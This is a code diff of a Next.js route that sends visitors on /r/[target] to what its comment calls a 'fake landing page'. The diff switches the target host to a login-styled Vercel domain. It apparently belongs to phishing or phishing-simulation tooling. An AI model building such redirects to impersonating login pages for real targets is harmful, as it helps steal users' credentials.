@@ -1,6 +1,6 @@
 import { NextRequest, NextResponse } from "next/server";
 
-const LANDING_BASE = "https://www-website.vercel.app";
+const LANDING_BASE = "https://www-login.vercel.app";
 
 /**
  * Redirect /r/[target] to the fake landing page.
@@ -14,6 +14,6 @@ export async function GET(
   if (!slug || typeof slug !== "string") {
     return NextResponse.redirect(new URL("/", LANDING_BASE), 302);
   }
-  const url = `${LANDING_BASE}/login/${encodeURIComponent(slug)}`;
+  const url = `${LANDING_BASE}/${encodeURIComponent(slug)}`;
   return NextResponse.redirect(url, 302);
 }
